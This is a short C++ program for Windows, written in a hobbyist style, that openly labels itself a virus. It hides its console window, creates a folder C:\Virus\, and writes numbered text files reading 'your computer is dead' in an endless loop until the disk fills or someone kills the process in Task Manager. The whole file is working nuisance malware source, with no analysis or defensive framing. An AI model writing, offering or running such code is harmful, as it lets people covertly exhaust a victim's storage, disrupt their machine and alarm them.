#include <iostream>
#include <fstream> //for openning the files and write inside of them
#include <string> //to deal with strings
#include <direct.h> //to create a directory
#include <Windows.h> //so we can make the program anonymous

int main(){
    FreeConsole(); // this will end , only if u open a task manager and end==vscode-task
    int h = 0;
    const char *path = "C:\\Virus\\"; // path to create a folder Virus 
    std::string str ="your computer is dead";
    _mkdir(path); //this function will create the directory
    
    while (true){
        ++h; // how much files our virus made 
        std::ofstream Virus;
        // open the file "Virus" 
        Virus.open(path + std::to_string(h) + ".txt", std::ios_base::out);
        Virus << str; // output the data into file 
        Virus.close(); // close the file 
    }
}